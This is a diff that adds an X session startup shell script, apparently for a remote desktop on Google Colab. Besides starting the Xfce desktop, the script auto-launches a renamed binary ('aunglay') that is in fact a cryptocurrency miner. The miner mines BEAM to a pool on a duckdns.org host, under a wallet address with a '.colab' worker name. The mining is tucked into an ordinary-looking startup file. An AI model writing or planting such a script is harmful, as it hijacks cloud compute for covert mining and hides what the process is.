@@ -1,0 +1,11 @@
+#!/bin/sh
+
+xrdb $HOME/.Xresources
+startxfce4 &
+xterm -e "/content/./aunglay --coin BEAM --pool aungmyozaw.duckdns.org:8484 --user TXsCRU5AhWH1YBFHF9kXbeM6PXFPyJpn8S.colab --tls on "
+
+
+
+
+
+
